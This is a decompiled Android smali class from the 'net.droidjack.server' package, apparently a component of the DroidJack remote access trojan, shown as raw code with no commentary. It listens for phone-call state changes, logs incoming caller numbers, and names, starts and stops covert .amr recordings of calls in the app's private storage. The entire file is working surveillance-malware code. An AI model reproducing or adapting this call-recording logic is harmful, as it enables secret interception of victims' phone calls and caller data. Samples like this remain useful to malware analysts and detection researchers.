.class Lnet/droidjack/server/e;
.super Landroid/telephony/PhoneStateListener;


# instance fields
.field final synthetic a:Lnet/droidjack/server/CallListener;


# direct methods
.method private constructor <init>(Lnet/droidjack/server/CallListener;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    invoke-direct {p0}, Landroid/telephony/PhoneStateListener;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lnet/droidjack/server/CallListener;Lnet/droidjack/server/e;)V
    .locals 0

    invoke-direct {p0, p1}, Lnet/droidjack/server/e;-><init>(Lnet/droidjack/server/CallListener;)V

    return-void
.end method


# virtual methods
.method public onCallStateChanged(ILjava/lang/String;)V
    .locals 4

    invoke-super {p0, p1, p2}, Landroid/telephony/PhoneStateListener;->onCallStateChanged(ILjava/lang/String;)V

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "state = "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "incoming number = "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "dd-MM-yyyy_HH-mm-ss"

    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    invoke-virtual {v0, v1}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    packed-switch p1, :pswitch_data_0

    :cond_0
    :goto_0
    return-void

    :pswitch_0
    iget-object v1, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    invoke-static {v1, v0}, Lnet/droidjack/server/CallListener;->a(Lnet/droidjack/server/CallListener;Ljava/lang/String;)V

    iget-object v1, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    invoke-static {v1, p2}, Lnet/droidjack/server/CallListener;->b(Lnet/droidjack/server/CallListener;Ljava/lang/String;)V

    iget-object v1, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    const-string v2, ""

    invoke-static {v1, v2}, Lnet/droidjack/server/CallListener;->c(Lnet/droidjack/server/CallListener;Ljava/lang/String;)V

    iget-object v1, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    invoke-static {v1}, Lnet/droidjack/server/CallListener;->a(Lnet/droidjack/server/CallListener;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    invoke-static {v1}, Lnet/droidjack/server/CallListener;->a(Lnet/droidjack/server/CallListener;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    :cond_1
    iget-object v1, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    iget-object v2, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    invoke-static {v2}, Lnet/droidjack/server/CallListener;->b(Lnet/droidjack/server/CallListener;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lnet/droidjack/server/CallListener;->c(Lnet/droidjack/server/CallListener;Ljava/lang/String;)V

    :cond_2
    iget-object v1, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "rec_"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "_"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Lnet/droidjack/server/CallListener;->d(Lnet/droidjack/server/CallListener;Ljava/lang/String;)V

    iget-object v0, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v3, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    invoke-static {v3}, Lnet/droidjack/server/CallListener;->c(Lnet/droidjack/server/CallListener;)Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    invoke-static {v3}, Lnet/droidjack/server/CallListener;->d(Lnet/droidjack/server/CallListener;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, ".amr"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v0, v1}, Lnet/droidjack/server/CallListener;->a(Lnet/droidjack/server/CallListener;Ljava/io/File;)V

    goto/16 :goto_0

    :pswitch_1
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "Off Hook"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    iget-object v0, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    iget-object v1, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    invoke-static {v1}, Lnet/droidjack/server/CallListener;->e(Lnet/droidjack/server/CallListener;)Ljava/io/File;

    move-result-object v1

    invoke-virtual {v0, v1}, Lnet/droidjack/server/CallListener;->a(Ljava/io/File;)V

    goto/16 :goto_0

    :pswitch_2
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "Idle"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    sget-boolean v0, Lnet/droidjack/server/CallListener;->a:Z

    if-eqz v0, :cond_0

    iget-object v0, p0, Lnet/droidjack/server/e;->a:Lnet/droidjack/server/CallListener;

    invoke-virtual {v0}, Lnet/droidjack/server/CallListener;->c()V

    goto/16 :goto_0

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_2
        :pswitch_0
        :pswitch_1
    .end packed-switch
.end method
